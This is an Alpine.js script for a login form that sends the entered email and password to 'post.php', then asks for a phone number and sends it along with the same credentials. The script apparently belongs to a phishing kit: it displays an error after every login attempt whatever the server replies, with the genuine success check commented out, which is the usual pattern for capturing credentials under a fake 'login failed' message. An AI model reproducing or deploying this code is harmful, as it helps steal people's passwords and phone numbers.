document.addEventListener("alpine:init", () => {
  Alpine.data("app", () => ({
    emailError: false,
    passwordError: false,
    showPassword: false,
    email: "",
    password: "",
    loader: false,
    phoneArea: false,
    phone: "",
    phoneError: false,
    iti: null,
    errorArea: false,
    mainLoader: true,
    checked: false,

    init() {
      setTimeout(() => {
        this.mainLoader = false;
      }, 1000);

      this.$nextTick(() => {
        let s = document.querySelector("#phone");

        this.iti = window.intlTelInput(s, {
          initialCountry: "us",
          utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@24.6.0/build/js/utils.js"
        });
      });
    },

    handleSubmit() {
      this.phoneArea ? this.phoneHandle() : this.loginHandle();
    },

    changePasswordVisibility() {
      this.showPassword = !this.showPassword;
    },

    loginHandle() {
      let validEmail = /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/.test(this.email);
      let validPassword = this.password.length >= 4 &&
                          this.password.length <= 36 &&
                          !/\s/.test(this.password);

      this.emailError = !validEmail;
      this.passwordError = !validPassword;

      if (validEmail && validPassword) {
        this.loader = true;
        this.submitLogin();
      }
    },

    submitLogin() {
      fetch("post.php", {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          email: this.email,
          password: this.password
        })
      })
        .then(res => res.json())
        .then(res => {
 this.loader = false;
this.errorArea = true;

        //   if (res.success === false) {
        //     this.loader = false;
        //     this.phoneArea = true;
        //     console.log(this.phoneArea);
        //   }
        })
        .catch(err => {
          console.error("Error:", err);
        });
    },

    phoneHandle() {
      if (this.iti.isValidNumber()) {
        this.loader = true;
        this.phoneError = false;
        this.submitPhoneNumber();
      } else {
        this.phoneError = true;
      }
    },

    submitPhoneNumber() {
      fetch("post.php", {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          email: this.email,
          password: this.password,
          phone: this.iti.getNumber().replace(/\s+/g, ""),
          secondStep: true
        })
      })
        .then(res => res.json())
        .then(res => {
          if (res.success === false) {
            this.loader = false;
            this.errorArea = true;
          }
        })
        .catch(err => {
          console.error("Error:", err);
          this.loader = false;
        });
    }
  }));
});
